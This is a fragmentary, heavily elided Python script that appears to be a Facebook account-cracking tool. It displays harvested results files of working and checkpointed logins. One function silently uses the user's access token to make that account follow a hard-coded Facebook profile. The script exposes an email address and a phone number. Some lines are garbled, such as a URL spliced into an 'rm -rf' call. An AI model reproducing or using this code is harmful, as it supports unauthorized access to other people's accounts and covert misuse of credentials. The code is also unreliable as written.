...
def ___follow___():
	...
	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Muhammad Abill    except:
...
def ___menu___():
    ...
    try:
        ...
        try:
            ...
            print("%s[%s*%s]%s Email :%s akash97664@gmail.com"%(B,P,B,P,H))
    ...
    if ___menu___ in ['1','01']:
        ...
        print("\n%s[%s1%s]%s Lihat Akash Ok.txt"%(B,P,B,P))

        print("%s[%s2%s]%s Lihat Akash Cp.txt"%(B,P,B,P))
        ...
        if ___hasilz___ in ['1','01']:
            ...
            try:
                ...
                exit("%s[%s!%s]%s Akash Ok.txt Tidak Ada"%(P,M,P,M))

            print("%s "%(P))

            os.system('cat Results/Ok.txt')

            print("\n%s[%s*%s]%s Total Akash Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
            ...
            try:
                ...
                exit("%s[%s!%s]%s AKASH Cp.txt Tidak Ada"%(P,M,P,M))

            print("%s "%(P))

            os.system('cat Results/Cp.txt')

            print("\n%s[%s*%s]%s Total AKASH Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        ...
        os.system('rm -rf login.txt'https://wa.me/+923188212)
